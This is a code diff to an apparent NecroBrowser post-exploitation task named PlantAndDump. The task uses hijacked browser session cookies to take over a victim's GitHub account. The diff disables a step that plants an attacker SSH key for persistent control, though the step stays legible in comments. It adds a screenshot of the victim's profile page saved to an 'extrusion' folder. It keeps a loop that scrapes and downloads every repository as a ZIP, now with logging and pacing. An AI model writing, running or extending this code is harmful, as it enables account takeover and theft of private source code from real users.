@@ -33,17 +33,22 @@ exports.PlantAndDump = async ({ page, data: [taskId, cookies, params] }) => {
     }
 
     // screenshot urls of interest
-    for(let url of params.urls){
-        await necrohelp.ScreenshotFullPage(page, taskId, url).catch(console.error)
-    }
+    //for(let url of params.urls){
+    //    await necrohelp.ScreenshotFullPage(page, taskId, url).catch(console.error)
+   // }
+
+   await page.goto('https://github.com/settings/profile');	
+   await page.screenshot({path: `extrusion/screenshot_${taskId}.png`});
 
     // plant necrobrowser ssh-key for necromantic control
-    await necrolib.PlantSshKey(page, taskId, 'necrokey', params.sshKey).catch(console.error)
+   // await necrolib.PlantSshKey(page, taskId, 'necrokey', params.sshKey).catch(console.error)
 
     // scrape all repositories and download master branches as ZIP
     let repositories = await necrolib.ScrapeRepos(page, taskId)
     for (let repo of repositories){
+	console.log(`[${taskId}] downloading repo --> ${repo}`)    
         await necrolib.DownloadRepo(page, taskId, repo)
+	await page.waitForTimeout(5000)
     }
 
     // this task is completed, so update the status accordingly
